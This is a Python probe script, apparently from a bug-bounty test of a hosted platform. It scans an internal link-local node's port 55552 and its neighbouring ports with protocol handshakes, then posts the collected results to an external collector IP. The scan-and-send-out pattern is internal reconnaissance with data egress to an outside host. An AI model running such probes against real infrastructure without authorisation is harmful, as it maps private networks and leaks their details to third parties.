#!/usr/bin/env python3
"""probe14 - close out the one unexplained port on the node (55552) and re-check its neighbourhood.

During the full-range sweep of the node gateway, 55552 accepted a TCP connection but a second later
refused one. That pattern fits a socket-activated listener (systemd accept=yes spawning per connection)
or a short-lived forwarder. This probe:

  * tries 55552 several times, recording each outcome and its timing;
  * if it accepts, leaving the socket silent for 3s to see whether the peer speaks first;
  * then, on a fresh connection each time, offers four common first bytes: an SSH identification
    string, an HTTP request, a TLS ClientHello, and a PostgreSQL SSLRequest - recording whatever comes
    back, which identifies the protocol family without guessing;
  * checks 55551/55553 to see whether the listener is part of a block;
  * repeats 55552 against the node's ULA to see whether the bind is address-specific.

Read-only. No credentials, no exploitation, nothing written to the peer beyond protocol-appropriate probes.
"""
from __future__ import annotations

import json
import os
import socket
import ssl
import struct
import threading
import time
from http.server import BaseHTTPRequestHandler, HTTPServer

COLLECTOR = "http://208.87.134.252:9200/rt14"
NODE = "169.254.1.2"
NODE_ULA = "fda7:a938:5bfe:5fa6:0:5e9:67ef:f8d"
TARGET_PORT = 55552
RESULTS = {"stage": "init", "attempts": [], "protocols": {}, "neighbours": {}, "ula": {}, "notes": []}
UA = "aiven-bugbounty/1.0 (Bugcrowd-zllr; researcher: zllr)"


class H(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.send_header("Content-Type", "application/json")
        self.end_headers()
        self.wfile.write(json.dumps(RESULTS, indent=1).encode())

    def log_message(self, *a):
        pass


def sock_for(host):
    fam = socket.AF_INET6 if ":" in host else socket.AF_INET
    s = socket.socket(fam, socket.SOCK_STREAM)
    s.settimeout(4)
    return s


def attempt(host, port, label, send=None, wait=3.0, timeout=4.0):
    rec = {"label": label, "target": "%s:%d" % (host, port), "sent": (send or b"")[:40].decode("latin1", "replace")}
    t0 = time.time()
    try:
        s = sock_for(host)
        s.settimeout(timeout)
        s.connect((host, port))
        rec["connect_ms"] = int((time.time() - t0) * 1000)
        if send:
            s.sendall(send)
        s.settimeout(wait)
        try:
            d = s.recv(300)
            rec["reply"] = repr(d[:200])
        except socket.timeout:
            rec["reply"] = "(silent for %.0fs)" % wait
        s.close()
    except Exception as e:                                              # noqa: BLE001
        rec["error"] = "%s: %s" % (type(e).__name__, str(e)[:70])
        rec["elapsed_ms"] = int((time.time() - t0) * 1000)
    RESULTS["attempts"].append(rec)


threading.Thread(target=lambda: HTTPServer(("0.0.0.0", int(os.environ.get("PORT", "8080"))), H).serve_forever(),
                 daemon=True).start()
time.sleep(2)

# 1. repeat the observation that started this: does 55552 accept, and does it stay?
for i in range(4):
    attempt(NODE, TARGET_PORT, "banner-wait-%d" % (i + 1), send=None, wait=3.0)
    time.sleep(2)

# 2. protocol probes, fresh connection each
attempt(NODE, TARGET_PORT, "ssh-ident", send=b"SSH-2.0-probe\r\n")
attempt(NODE, TARGET_PORT, "http-get", send=b"GET / HTTP/1.0\r\nHost: node\r\nUser-Agent: " + UA.encode() + b"\r\n\r\n")
attempt(NODE, TARGET_PORT, "pg-sslrequest", send=struct.pack("!ii", 8, 80877103))
try:
    s = sock_for(NODE)
    s.settimeout(6)
    s.connect((NODE, TARGET_PORT))
    ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    t = ctx.wrap_socket(s, server_hostname=NODE)
    RESULTS["protocols"]["tls"] = "handshake ok: %s" % t.version()
    t.close()
except Exception as e:                                                  # noqa: BLE001
    RESULTS["protocols"]["tls"] = "%s: %s" % (type(e).__name__, str(e)[:70])

# 3. is it part of a block?
for p in (55550, 55551, 55553, 55554):
    r = {"port": p}
    try:
        s = sock_for(NODE)
        s.settimeout(2.5)
        s.connect((NODE, p))
        s.settimeout(2)
        try:
            r["reply"] = repr(s.recv(120))
        except socket.timeout:
            r["reply"] = "(silent)"
        s.close()
    except Exception as e:                                              # noqa: BLE001
        r["error"] = type(e).__name__
    RESULTS["neighbours"][str(p)] = r

# 4. address-specific bind? same port over the node's ULA
for lbl, host in (("ula", NODE_ULA),):
    rec = {}
    try:
        s = sock_for(host)
        s.settimeout(3)
        s.connect((host, TARGET_PORT))
        s.settimeout(2)
        try:
            rec["reply"] = repr(s.recv(120))
        except socket.timeout:
            rec["reply"] = "(silent)"
        s.close()
    except Exception as e:                                              # noqa: BLE001
        rec["error"] = "%s: %s" % (type(e).__name__, str(e)[:60])
    RESULTS["ula"] = rec

RESULTS["stage"] = "done"
RESULTS["finished"] = time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime())
body = json.dumps(RESULTS)
try:
    import urllib.request
    urllib.request.urlopen(urllib.request.Request(COLLECTOR, data=body.encode(),
                                                  headers={"Content-Type": "application/json"}), timeout=25)
except Exception as e:                                                  # noqa: BLE001
    print("collector post failed:", e)
print(json.dumps(RESULTS)[:3000])
while True:
    time.sleep(60)
